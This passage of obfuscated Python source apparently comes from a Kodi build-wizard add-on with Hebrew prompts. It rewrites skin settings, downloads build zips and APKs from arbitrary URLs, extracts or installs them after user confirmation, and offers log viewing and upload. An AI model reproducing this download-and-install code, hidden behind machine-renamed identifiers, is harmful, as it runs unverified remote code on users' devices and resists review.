			O00O000O000O000O0 .write (OOOOO0OO00O000O00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0O00OO0O0O0O0000 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4257
			O00O000O000O000O0 .close ()#line:4258
			OO0O0000O00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4262
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'r')#line:4264
			OOOOO0OO00O000O00 =O00O000O000O000O0 .read ()#line:4265
			O00O000O000O000O0 .close ()#line:4266
			O0OOO0000OOO000OO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4267
			O0O00OO0O0O0O0000 =re .compile (O0OOO0000OOO000OO ).findall (OOOOO0OO00O000O00 )[0 ]#line:4268
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'w')#line:4269
			O00O000O000O000O0 .write (OOOOO0OO00O000O00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0O00OO0O0O0O0000 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4270
			O00O000O000O000O0 .close ()#line:4271
			OO0O0000O00OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4275
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'r')#line:4277
			OOOOO0OO00O000O00 =O00O000O000O000O0 .read ()#line:4278
			O00O000O000O000O0 .close ()#line:4279
			O0OOO0000OOO000OO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4280
			O0O00OO0O0O0O0000 =re .compile (O0OOO0000OOO000OO ).findall (OOOOO0OO00O000O00 )[0 ]#line:4281
			O00O000O000O000O0 =open (OO0O0000O00OO000O ,'w')#line:4282
			O00O000O000O000O0 .write (OOOOO0OO00O000O00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0O00OO0O0O0O0000 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4283
			O00O000O000O000O0 .close ()#line:4284
		except :#line:4289
			pass #line:4290
def thirdPartyInstall (OOO0O0OO00OO0000O ,OOOOOOOOOO00O0O00 ):#line:4292
	if not wiz .workingURL (OOOOOOOOOO00O0O00 ):#line:4293
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4294
	OO000O0OO0OOO0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O0OO00OO0000O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4295
	if OO000O0OO0OOO0OO0 ==1 :#line:4296
		freshStart ('third',True )#line:4297
	wiz .clearS ('build')#line:4298
	O00O000OOOO00O0OO =OOO0O0OO00OO0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4299
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4300
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0OO00OO0000O ),'','אנא המתן')#line:4301
	O0000O00O0000O0OO =os .path .join (PACKAGES ,'%s.zip'%O00O000OOOO00O0OO )#line:4302
	try :os .remove (O0000O00O0000O0OO )#line:4303
	except :pass #line:4304
	downloader .download (OOOOOOOOOO00O0O00 ,O0000O00O0000O0OO ,DP )#line:4305
	xbmc .sleep (1000 )#line:4306
	OO000O0OOO00OOO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0OO00OO0000O )#line:4307
	DP .update (0 ,OO000O0OOO00OOO0O ,'','אנא המתן')#line:4308
	OO00000OOO0O0OO0O ,OO0O0O0000OO00OO0 ,OO0O00O0O000O000O =extract .all (O0000O00O0000O0OO ,HOME ,DP ,title =OO000O0OOO00OOO0O )#line:4309
	if int (float (OO00000OOO0O0OO0O ))>0 :#line:4310
		wiz .fixmetas ()#line:4311
		wiz .lookandFeelData ('save')#line:4312
		wiz .defaultSkin ()#line:4313
		wiz .setS ('installed','true')#line:4315
		wiz .setS ('extract',str (OO00000OOO0O0OO0O ))#line:4316
		wiz .setS ('errors',str (OO0O0O0000OO00OO0 ))#line:4317
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00000OOO0O0OO0O ,OO0O0O0000OO00OO0 ))#line:4318
		try :os .remove (O0000O00O0000O0OO )#line:4319
		except :pass #line:4320
		if int (float (OO0O0O0000OO00OO0 ))>0 :#line:4321
			OO000O00000OO0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0OO00OO0000O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00000OOO0O0OO0O ,'%',COLOR1 ,OO0O0O0000OO00OO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4322
			if OO000O00000OO0000 :#line:4323
				if isinstance (OO0O0O0000OO00OO0 ,unicode ):#line:4324
					OO0O00O0O000O000O =OO0O00O0O000O000O .encode ('utf-8')#line:4325
				wiz .TextBox (ADDONTITLE ,OO0O00O0O000O000O )#line:4326
	DP .close ()#line:4327
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4328
	if INSTALLMETHOD ==1 :OOOOOO00OOOO00O00 =1 #line:4329
	elif INSTALLMETHOD ==2 :OOOOOO00OOOO00O00 =0 #line:4330
	else :OOOOOO00OOOO00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4331
	if OOOOOO00OOOO00O00 ==1 :wiz .reloadFix ()#line:4332
	else :wiz .killxbmc (True )#line:4333
def testTheme (O0O000O0000000O00 ):#line:4335
	OO000O0000000O00O =zipfile .ZipFile (O0O000O0000000O00 )#line:4336
	for O00OO00000OOOOOOO in OO000O0000000O00O .infolist ():#line:4337
		if '/settings.xml'in O00OO00000OOOOOOO .filename :#line:4338
			return True #line:4339
	return False #line:4340
def testGui (OO0O00OO000O000O0 ):#line:4342
	O000OOOOO0OO0O00O =zipfile .ZipFile (OO0O00OO000O000O0 )#line:4343
	for OO0000OOOO00O00O0 in O000OOOOO0OO0O00O .infolist ():#line:4344
		if '/guisettings.xml'in OO0000OOOO00O00O0 .filename :#line:4345
			return True #line:4346
	return False #line:4347
def apkInstaller (OO0OO0000000OO0O0 ,O0O0O0OOOO0OO0000 ):#line:4349
	wiz .log (OO0OO0000000OO0O0 )#line:4350
	wiz .log (O0O0O0OOOO0OO0000 )#line:4351
	if wiz .platform ()=='android':#line:4352
		OOO0OOOO00OO0OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0000000OO0O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4353
		if not OOO0OOOO00OO0OOO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4354
		OOOO0OO00OO00O0OO =OO0OO0000000OO0O0 #line:4355
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4356
		if not wiz .workingURL (O0O0O0OOOO0OO0000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4357
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO00OO00O0OO ),'','אנא המתן')#line:4358
		OO0OOOOO000OO00O0 =os .path .join (PACKAGES ,"%s.apk"%OO0OO0000000OO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4359
		try :os .remove (OO0OOOOO000OO00O0 )#line:4360
		except :pass #line:4361
		downloader .download (O0O0O0OOOO0OO0000 ,OO0OOOOO000OO00O0 ,DP )#line:4362
		xbmc .sleep (100 )#line:4363
		DP .close ()#line:4364
		notify .apkInstaller (OO0OO0000000OO0O0 )#line:4365
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0OOOOO000OO00O0 +'")')#line:4366
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4367
def createMenu (OO000OOO0O00OOOOO ,O0O0O0O0OO0OO00OO ,O0O00OO0OOOO00000 ):#line:4373
	if OO000OOO0O00OOOOO =='saveaddon':#line:4374
		O0OOO0OOO00O0OO0O =[]#line:4375
		O0O000O000O0OOOOO =urllib .quote_plus (O0O0O0O0OO0OO00OO .lower ().replace (' ',''))#line:4376
		O0OOOOOOOO00OOOO0 =O0O0O0O0OO0OO00OO .replace ('Debrid','Real Debrid')#line:4377
		O0OOO0O0OOO0O0000 =urllib .quote_plus (O0O00OO0OOOO00000 .lower ().replace (' ',''))#line:4378
		O0O00OO0OOOO00000 =O0O00OO0OOOO00000 .replace ('url','URL Resolver')#line:4379
		O0OOO0OOO00O0OO0O .append ((THEME2 %O0O00OO0OOOO00000 .title (),' '))#line:4380
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Save %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4381
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Restore %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4382
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Clear %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4383
	elif OO000OOO0O00OOOOO =='save':#line:4384
		O0OOO0OOO00O0OO0O =[]#line:4385
		O0O000O000O0OOOOO =urllib .quote_plus (O0O0O0O0OO0OO00OO .lower ().replace (' ',''))#line:4386
		O0OOOOOOOO00OOOO0 =O0O0O0O0OO0OO00OO .replace ('Debrid','Real Debrid')#line:4387
		O0OOO0O0OOO0O0000 =urllib .quote_plus (O0O00OO0OOOO00000 .lower ().replace (' ',''))#line:4388
		O0O00OO0OOOO00000 =O0O00OO0OOOO00000 .replace ('url','URL Resolver')#line:4389
		O0OOO0OOO00O0OO0O .append ((THEME2 %O0O00OO0OOOO00000 .title (),' '))#line:4390
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Register %s'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4391
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Save %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4392
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Restore %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4393
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Import %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4394
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Clear Addon %s Data'%O0OOOOOOOO00OOOO0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O000O000O0OOOOO ,O0OOO0O0OOO0O0000 )))#line:4395
	elif OO000OOO0O00OOOOO =='install':#line:4396
		O0OOO0OOO00O0OO0O =[]#line:4397
		O0OOO0O0OOO0O0000 =urllib .quote_plus (O0O00OO0OOOO00000 )#line:4398
		O0OOO0OOO00O0OO0O .append ((THEME2 %O0O00OO0OOOO00000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OOO0O0OOO0O0000 )))#line:4399
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OOO0O0OOO0O0000 )))#line:4400
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OOO0O0OOO0O0000 )))#line:4401
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OOO0O0OOO0O0000 )))#line:4402
		O0OOO0OOO00O0OO0O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OOO0O0OOO0O0000 )))#line:4403
	O0OOO0OOO00O0OO0O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4404
	return O0OOO0OOO00O0OO0O #line:4405
def toggleCache (O0O000OO0O00O0OOO ):#line:4407
	O000OO00O00OOO000 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4408
	OO0O0O0OOO0O0000O =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4409
	if O0O000OO0O00O0OOO in ['true','false']:#line:4410
		for O000000O0O00OO000 in O000OO00O00OOO000 :#line:4411
			wiz .setS (O000000O0O00OO000 ,O0O000OO0O00O0OOO )#line:4412
	else :#line:4413
		if not O0O000OO0O00O0OOO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4414
			try :#line:4415
				O000000O0O00OO000 =OO0O0O0OOO0O0000O [O000OO00O00OOO000 .index (O0O000OO0O00O0OOO )]#line:4416
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O000000O0O00OO000 ))#line:4417
			except :#line:4418
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0O000OO0O00O0OOO ))#line:4419
		else :#line:4420
			OO0O00OOO00OO00OO ='true'if wiz .getS (O0O000OO0O00O0OOO )=='false'else 'false'#line:4421
			wiz .setS (O0O000OO0O00O0OOO ,OO0O00OOO00OO00OO )#line:4422
def playVideo (OO000O0OO0O00O00O ):#line:4424
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO000O0OO0O00O00O )#line:4425
	if 'watch?v='in OO000O0OO0O00O00O :#line:4426
		OOOO0O0000OO0000O ,OO0OOO0O0OO00O0O0 =OO000O0OO0O00O00O .split ('?')#line:4427
		O0O00O0O00000OOO0 =OO0OOO0O0OO00O0O0 .split ('&')#line:4428
		for O0O0O00O0OOO0O00O in O0O00O0O00000OOO0 :#line:4429
			if O0O0O00O0OOO0O00O .startswith ('v='):#line:4430
				OO000O0OO0O00O00O =O0O0O00O0OOO0O00O [2 :]#line:4431
				break #line:4432
			else :continue #line:4433
	elif 'embed'in OO000O0OO0O00O00O or 'youtu.be'in OO000O0OO0O00O00O :#line:4434
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO000O0OO0O00O00O )#line:4435
		OOOO0O0000OO0000O =OO000O0OO0O00O00O .split ('/')#line:4436
		if len (OOOO0O0000OO0000O [-1 ])>5 :#line:4437
			OO000O0OO0O00O00O =OOOO0O0000OO0000O [-1 ]#line:4438
		elif len (OOOO0O0000OO0000O [-2 ])>5 :#line:4439
			OO000O0OO0O00O00O =OOOO0O0000OO0000O [-2 ]#line:4440
	wiz .log ("YouTube URL: %s"%OO000O0OO0O00O00O )#line:4441
	yt .PlayVideo (OO000O0OO0O00O00O )#line:4442
def viewLogFile ():#line:4444
	O00O0000O00OOO0OO =wiz .Grab_Log (True )#line:4445
	OO0OO00O0OOOO00OO =wiz .Grab_Log (True ,True )#line:4446
	O0O0OOOOOOOOOOO0O =0 ;OO00OOOOOOOOOO00O =O00O0000O00OOO0OO #line:4447
	if not OO0OO00O0OOOO00OO ==False and not O00O0000O00OOO0OO ==False :#line:4448
		O0O0OOOOOOOOOOO0O =DIALOG .select (ADDONTITLE ,["View %s"%O00O0000O00OOO0OO .replace (LOG ,""),"View %s"%OO0OO00O0OOOO00OO .replace (LOG ,"")])#line:4449
		if O0O0OOOOOOOOOOO0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4450
	elif O00O0000O00OOO0OO ==False and OO0OO00O0OOOO00OO ==False :#line:4451
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4452
		return #line:4453
	elif not O00O0000O00OOO0OO ==False :O0O0OOOOOOOOOOO0O =0 #line:4454
	elif not OO0OO00O0OOOO00OO ==False :O0O0OOOOOOOOOOO0O =1 #line:4455
	OO00OOOOOOOOOO00O =O00O0000O00OOO0OO if O0O0OOOOOOOOOOO0O ==0 else OO0OO00O0OOOO00OO #line:4457
	O0000O0O00O0OOO00 =wiz .Grab_Log (False )if O0O0OOOOOOOOOOO0O ==0 else wiz .Grab_Log (False ,True )#line:4458
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00OOOOOOOOOO00O ),O0000O0O00O0OOO00 )#line:4460
def errorChecking (log =None ,count =None ,all =None ):#line:4462
	if log ==None :#line:4463
		O0OOO0O00O0OOOO00 =wiz .Grab_Log (True )#line:4464
		O000OOOO00000OOO0 =wiz .Grab_Log (True ,True )#line:4465
		if not O000OOOO00000OOO0 ==False and not O0OOO0O00O0OOOO00 ==False :#line:4466
			O00OOO0O0O0OOOOOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0OOO0O00O0OOOO00 .replace (LOG ,""),errorChecking (O0OOO0O00O0OOOO00 ,True ,True )),"View %s: %s error(s)"%(O000OOOO00000OOO0 .replace (LOG ,""),errorChecking (O000OOOO00000OOO0 ,True ,True ))])#line:4467
			if O00OOO0O0O0OOOOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4468
		elif O0OOO0O00O0OOOO00 ==False and O000OOOO00000OOO0 ==False :#line:4469
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4470
			return #line:4471
		elif not O0OOO0O00O0OOOO00 ==False :O00OOO0O0O0OOOOOO =0 #line:4472
		elif not O000OOOO00000OOO0 ==False :O00OOO0O0O0OOOOOO =1 #line:4473
		log =O0OOO0O00O0OOOO00 if O00OOO0O0O0OOOOOO ==0 else O000OOOO00000OOO0 #line:4474
	if log ==False :#line:4475
		if count ==None :#line:4476
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4477
			return False #line:4478
		else :#line:4479
			return 0 #line:4480
	else :#line:4481
		if os .path .exists (log ):#line:4482
			OO0O000OO0O00OOOO =open (log ,mode ='r');OOO0O000O0O0OO0O0 =OO0O000OO0O00OOOO .read ().replace ('\n','').replace ('\r','');OO0O000OO0O00OOOO .close ()#line:4483
			O0OO000OOOO00O0O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO0O000O0O0OO0O0 )#line:4484
			if not count ==None :#line:4485
				if all ==None :#line:4486
					OOOO0OOOOO0OO0OO0 =0 #line:4487
					for OO0OO0O00O0O00OO0 in O0OO000OOOO00O0O0 :#line:4488
						if ADDON_ID in OO0OO0O00O0O00OO0 :OOOO0OOOOO0OO0OO0 +=1 #line:4489
					return OOOO0OOOOO0OO0OO0 #line:4490
				else :return len (O0OO000OOOO00O0O0 )#line:4491
			if len (O0OO000OOOO00O0O0 )>0 :#line:4492
				OOOO0OOOOO0OO0OO0 =0 ;OO0000OO0OOOOOOO0 =""#line:4493
				for OO0OO0O00O0O00OO0 in O0OO000OOOO00O0O0 :#line:4494
					if all ==None and not ADDON_ID in OO0OO0O00O0O00OO0 :continue #line:4495
					else :#line:4496
						OOOO0OOOOO0OO0OO0 +=1 #line:4497
						OO0000OO0OOOOOOO0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOO0OOOOO0OO0OO0 ,OO0OO0O00O0O00OO0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4498
				if OOOO0OOOOO0OO0OO0 >0 :#line:4499
					wiz .TextBox (ADDONTITLE ,OO0000OO0OOOOOOO0 )#line:4500
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4501
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4502
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4503
ACTION_PREVIOUS_MENU =10 #line:4505
ACTION_NAV_BACK =92 #line:4506
ACTION_MOVE_LEFT =1 #line:4507
ACTION_MOVE_RIGHT =2 #line:4508
ACTION_MOVE_UP =3 #line:4509
ACTION_MOVE_DOWN =4 #line:4510
ACTION_MOUSE_WHEEL_UP =104 #line:4511
ACTION_MOUSE_WHEEL_DOWN =105 #line:4512
ACTION_MOVE_MOUSE =107 #line:4513
ACTION_SELECT_ITEM =7 #line:4514
ACTION_BACKSPACE =110 #line:4515
ACTION_MOUSE_LEFT_CLICK =100 #line:4516
ACTION_MOUSE_LONG_CLICK =108 #line:4517
def LogViewer (default =None ):#line:4519
	class OO0000OO00O00O0OO (xbmcgui .WindowXMLDialog ):#line:4520
		def __init__ (O0OOO0000OO0OO00O ,*OOOOOOO0O00O0O0OO ,**O00OO00OOO0OOO0O0 ):#line:4521
			O0OOO0000OO0OO00O .default =O00OO00OOO0OOO0O0 ['default']#line:4522
		def onInit (OOO0O000OOO00OO00 ):#line:4524
			OOO0O000OOO00OO00 .title =101 #line:4525
			OOO0O000OOO00OO00 .msg =102 #line:4526
			OOO0O000OOO00OO00 .scrollbar =103 #line:4527
			OOO0O000OOO00OO00 .upload =201 #line:4528
			OOO0O000OOO00OO00 .kodi =202 #line:4529
			OOO0O000OOO00OO00 .kodiold =203 #line:4530
			OOO0O000OOO00OO00 .wizard =204 #line:4531
			OOO0O000OOO00OO00 .okbutton =205 #line:4532
			O0OOOOO00O0000OO0 =open (OOO0O000OOO00OO00 .default ,'r')#line:4533
			OOO0O000OOO00OO00 .logmsg =O0OOOOO00O0000OO0 .read ()#line:4534
			O0OOOOO00O0000OO0 .close ()#line:4535
			OOO0O000OOO00OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O000OOO00OO00 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4536
			OOO0O000OOO00OO00 .showdialog ()#line:4537
		def showdialog (O0OOOOO00000O0OOO ):#line:4539
			O0OOOOO00000O0OOO .getControl (O0OOOOO00000O0OOO .title ).setLabel (O0OOOOO00000O0OOO .titlemsg )#line:4540
			O0OOOOO00000O0OOO .getControl (O0OOOOO00000O0OOO .msg ).setText (wiz .highlightText (O0OOOOO00000O0OOO .logmsg ))#line:4541
			O0OOOOO00000O0OOO .setFocusId (O0OOOOO00000O0OOO .scrollbar )#line:4542
		def onClick (OOO0O0OO0OOOO0000 ,OOOOO0O0OOOOOOO00 ):#line:4544
			if OOOOO0O0OOOOOOO00 ==OOO0O0OO0OOOO0000 .okbutton :OOO0O0OO0OOOO0000 .close ()#line:4545
			elif OOOOO0O0OOOOOOO00 ==OOO0O0OO0OOOO0000 .upload :OOO0O0OO0OOOO0000 .close ();uploadLog .Main ()#line:4546
			elif OOOOO0O0OOOOOOO00 ==OOO0O0OO0OOOO0000 .kodi :#line:4547
				OO00OOO000OOOO0OO =wiz .Grab_Log (False )#line:4548
				OO0O0OOOO0OO00OOO =wiz .Grab_Log (True )#line:4549
				if OO00OOO000OOOO0OO ==False :#line:4550
					OOO0O0OO0OOOO0000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4551
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .msg ).setText ("Log File Does Not Exists!")#line:4552
				else :#line:4553
					OOO0O0OO0OOOO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OOOO0OO00OOO .replace (LOG ,''))#line:4554
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .title ).setLabel (OOO0O0OO0OOOO0000 .titlemsg )#line:4555
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .msg ).setText (wiz .highlightText (OO00OOO000OOOO0OO ))#line:4556
					OOO0O0OO0OOOO0000 .setFocusId (OOO0O0OO0OOOO0000 .scrollbar )#line:4557
			elif OOOOO0O0OOOOOOO00 ==OOO0O0OO0OOOO0000 .kodiold :#line:4558
				OO00OOO000OOOO0OO =wiz .Grab_Log (False ,True )#line:4559
				OO0O0OOOO0OO00OOO =wiz .Grab_Log (True ,True )#line:4560
				if OO00OOO000OOOO0OO ==False :#line:4561
					OOO0O0OO0OOOO0000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4562
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .msg ).setText ("Log File Does Not Exists!")#line:4563
				else :#line:4564
					OOO0O0OO0OOOO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OOOO0OO00OOO .replace (LOG ,''))#line:4565
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .title ).setLabel (OOO0O0OO0OOOO0000 .titlemsg )#line:4566
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .msg ).setText (wiz .highlightText (OO00OOO000OOOO0OO ))#line:4567
					OOO0O0OO0OOOO0000 .setFocusId (OOO0O0OO0OOOO0000 .scrollbar )#line:4568
			elif OOOOO0O0OOOOOOO00 ==OOO0O0OO0OOOO0000 .wizard :#line:4569
				OO00OOO000OOOO0OO =wiz .Grab_Log (False ,False ,True )#line:4570
				OO0O0OOOO0OO00OOO =wiz .Grab_Log (True ,False ,True )#line:4571
				if OO00OOO000OOOO0OO ==False :#line:4572
					OOO0O0OO0OOOO0000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4573
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .msg ).setText ("Log File Does Not Exists!")#line:4574
				else :#line:4575
					OOO0O0OO0OOOO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OOOO0OO00OOO .replace (ADDONDATA ,''))#line:4576
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .title ).setLabel (OOO0O0OO0OOOO0000 .titlemsg )#line:4577
					OOO0O0OO0OOOO0000 .getControl (OOO0O0OO0OOOO0000 .msg ).setText (wiz .highlightText (OO00OOO000OOOO0OO ))#line:4578
					OOO0O0OO0OOOO0000 .setFocusId (OOO0O0OO0OOOO0000 .scrollbar )#line:4579
		def onAction (O0O0OO000OO0OOOOO ,OOO00O0O0O00O0OOO ):#line:4581
			if OOO00O0O0O00O0OOO ==ACTION_PREVIOUS_MENU :O0O0OO000OO0OOOOO .close ()#line:4582
			elif OOO00O0O0O00O0OOO ==ACTION_NAV_BACK :O0O0OO000OO0OOOOO .close ()#line:4583
	if default ==None :default =wiz .Grab_Log (True )#line:4584
	O0OO0OOOO00O00O00 =OO0000OO00O00O0OO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4585
	O0OO0OOOO00O00O00 .doModal ()#line:4586
	del O0OO0OOOO00O00O00 #line:4587
